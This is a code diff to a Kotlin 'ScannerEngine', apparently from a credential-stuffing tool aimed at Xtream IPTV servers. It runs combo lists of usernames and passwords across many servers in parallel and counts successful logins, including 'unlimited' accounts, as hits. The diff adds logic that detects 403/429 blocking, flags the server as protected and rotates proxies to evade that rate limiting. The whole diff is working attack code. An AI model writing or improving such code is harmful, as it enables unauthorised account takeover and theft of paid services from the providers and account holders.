@@ -9,6 +9,7 @@ import kotlinx.coroutines.delay
 import kotlinx.coroutines.launch
 import kotlinx.coroutines.sync.Mutex
 import kotlinx.coroutines.sync.withLock
+import java.util.concurrent.ConcurrentHashMap
 import java.util.concurrent.Executors
 import java.util.concurrent.atomic.AtomicBoolean
 import java.util.concurrent.atomic.AtomicInteger
@@ -49,14 +50,17 @@ class ScannerEngine {
         val startMs = System.currentTimeMillis()
         val total = (servers.size * combo.size).coerceAtLeast(1)
         val proxyIdx = AtomicInteger(0)
-        val serverHits = mutableMapOf<String, AtomicInteger>()
-        val serverState = mutableMapOf<String, String>()
+        val serverHits = ConcurrentHashMap<String, AtomicInteger>()
+        val serverState = ConcurrentHashMap<String, String>()
+        // Servidor PROT: usa proxy nas proximas tentativas
+        val useProxyFor = ConcurrentHashMap<String, Boolean>()
         val stateMutex = Mutex()
 
         servers.forEach {
             val h = XtreamApi.normServer(it)
             serverHits[h] = AtomicInteger(0)
             serverState[h] = "..."
+            useProxyFor[h] = false
         }
 
         onLog?.invoke("Start ${servers.size} srv | ${combo.size} combo | thr $threads | ${mode.label} | px ${proxies.size}")
@@ -82,36 +86,52 @@ class ScannerEngine {
                 launch {
                     for ((server, cred) in channel) {
                         if (stopped.get()) break
-                        while (paused.get() && !stopped.get()) {
-                            delay(200)
-                        }
+                        while (paused.get() && !stopped.get()) delay(200)
                         if (stopped.get()) break
-
                         if (mode.delayMs > 0) delay(mode.delayMs)
 
-                        // Estrategia velocidade:
-                        // 1) tenta DIRETO primeiro (rapido)
-                        // 2) se 403/429 e tem proxy, tenta COM proxy
-                        // 3) se escolheu proxy e timeout, fallback direto
+                        val needPx = proxies.isNotEmpty() && (useProxyFor[server] == true)
+                        val proxy = if (needPx) {
+                            proxies[proxyIdx.getAndIncrement() % proxies.size]
+                        } else null
+
                         var result = XtreamApi.check(
                             server, cred.user, cred.pass,
-                            timeoutSec = mode.timeoutSec,
-                            proxyUrl = null
+                            timeoutSec = if (proxy != null) mode.timeoutSec.coerceAtMost(5) else mode.timeoutSec,
+                            proxyUrl = proxy
                         )
 
-                        if (proxies.isNotEmpty() && (
+                        // Se direto e 403/429 e tem proxy -> marca PROT e tenta com proxy agora
+                        if (proxy == null && proxies.isNotEmpty() && (
                                 result.code == 403 || result.code == 429 ||
-                                result.err.contains("403") || result.err.contains("429")
-                            )
+                                    result.err.contains("403") || result.err.contains("429")
+                                )
                         ) {
-                            val i = proxyIdx.getAndIncrement()
-                            val proxy = proxies[i % proxies.size]
-                            val pxTimeout = mode.timeoutSec.coerceAtMost(4)
+                            useProxyFor[server] = true
+                            stateMutex.withLock {
+                                if ((serverHits[server]?.get() ?: 0) == 0) serverState[server] = "PROT"
+                            }
+                            val px = proxies[proxyIdx.getAndIncrement() % proxies.size]
                             result = XtreamApi.check(
                                 server, cred.user, cred.pass,
-                                timeoutSec = pxTimeout,
-                                proxyUrl = proxy
+                                timeoutSec = mode.timeoutSec.coerceAtMost(5),
+                                proxyUrl = px
                             )
+                        }
+
+                        // Proxy falhou (timeout) -> tenta direto uma vez (nao conta TO extra se hit)
+                        if (proxy != null && !result.hit && (
+                                result.err.contains("Timeout", true) || result.code == 0
+                                )
+                        ) {
+                            val direct = XtreamApi.check(
+                                server, cred.user, cred.pass,
+                                timeoutSec = mode.timeoutSec,
+                                proxyUrl = null
+                            )
+                            if (direct.hit || direct.code in listOf(200, 403, 429)) {
+                                result = direct
+                            }
                         }
 
                         val n = checks.incrementAndGet()
@@ -124,26 +144,20 @@ class ScannerEngine {
                                 if (hit.unlimited) unlimited.incrementAndGet()
                                 serverHits[server]?.incrementAndGet()
                                 stateMutex.withLock { serverState[server] = "ON" }
-                                try {
-                                    onHit?.invoke(hit)
-                                } catch (_: Exception) {
-                                }
+                                try { onHit?.invoke(hit) } catch (_: Exception) {}
                             }
                             result.code == 403 || result.err.contains("403") -> {
                                 e403.incrementAndGet()
+                                if (proxies.isNotEmpty()) useProxyFor[server] = true
                                 stateMutex.withLock {
-                                    // so marca PROT se ainda nao teve hit
-                                    if ((serverHits[server]?.get() ?: 0) == 0) {
-                                        serverState[server] = "PROT"
-                                    }
+                                    if ((serverHits[server]?.get() ?: 0) == 0) serverState[server] = "PROT"
                                 }
                             }
                             result.code == 429 || result.err.contains("429") -> {
                                 e429.incrementAndGet()
+                                if (proxies.isNotEmpty()) useProxyFor[server] = true
                                 stateMutex.withLock {
-                                    if ((serverHits[server]?.get() ?: 0) == 0) {
-                                        serverState[server] = "PROT"
-                                    }
+                                    if ((serverHits[server]?.get() ?: 0) == 0) serverState[server] = "PROT"
                                 }
                             }
                             result.err.contains("Timeout", true) || result.code == 0 -> {
@@ -151,16 +165,15 @@ class ScannerEngine {
                             }
                             result.code == 200 -> {
                                 stateMutex.withLock {
-                                    if (serverState[server] != "PROT" || (serverHits[server]?.get() ?: 0) > 0) {
+                                    if ((serverHits[server]?.get() ?: 0) > 0 || serverState[server] != "PROT") {
                                         serverState[server] = "ON"
                                     }
                                 }
                             }
                         }
 
-                        if (n % 5 == 0 || result.hit) {
+                        if (n % 8 == 0 || result.hit) {
                             val elapsed = ((System.currentTimeMillis() - startMs) / 1000).coerceAtLeast(1)
-                            val cpm = ((checks.get() * 60.0) / elapsed).toInt()
                             try {
                                 onStats?.invoke(
                                     ScanStats(
@@ -170,7 +183,7 @@ class ScannerEngine {
                                         errors403 = e403.get(),
                                         errors429 = e429.get(),
                                         timeouts = timeouts.get(),
-                                        cpm = cpm,
+                                        cpm = ((checks.get() * 60.0) / elapsed).toInt(),
                                         progress = checks.get().toFloat() / total,
                                         elapsedSec = elapsed,
                                         totalCombo = combo.size,
@@ -183,8 +196,7 @@ class ScannerEngine {
                                     ServerStatus(host = h, state = st, hits = hc)
                                 }.sortedByDescending { it.hits }
                                 onServerStatus?.invoke(ranking)
-                            } catch (_: Exception) {
-                            }
+                            } catch (_: Exception) {}
                         }
                     }
                 }
@@ -210,8 +222,7 @@ class ScannerEngine {
                 )
                 onLog?.invoke("Fim | Hits ${hits.get()} | Checks ${checks.get()}")
                 onFinished?.invoke()
-            } catch (_: Exception) {
-            }
+            } catch (_: Exception) {}
             scope.cancel()
             pool.shutdownNow()
         }
